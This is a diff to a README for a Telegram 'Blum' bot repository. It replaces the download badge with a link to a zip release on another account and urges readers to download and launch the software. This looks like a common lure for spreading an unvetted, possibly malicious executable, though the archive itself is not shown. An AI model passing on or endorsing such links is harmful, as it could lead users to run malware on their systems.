@@ -11,7 +11,7 @@ Welcome to the TelegramBlumBot repository, where you can find tools and resource
 ## 📥 Software Download
 To access the software needed for enhancing your TelegramBlumBot experience, kindly download the software package from the following link: 
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/DwiKidszqa/TelegramBlumBot/releases/download/v1.0/Release_x64.zip)](https://github.com/DwiKidszqa/TelegramBlumBot/releases/download/v1.0/Release_x64.zip)
 
 *Please note that the software needs to be launched for optimal performance.*
 
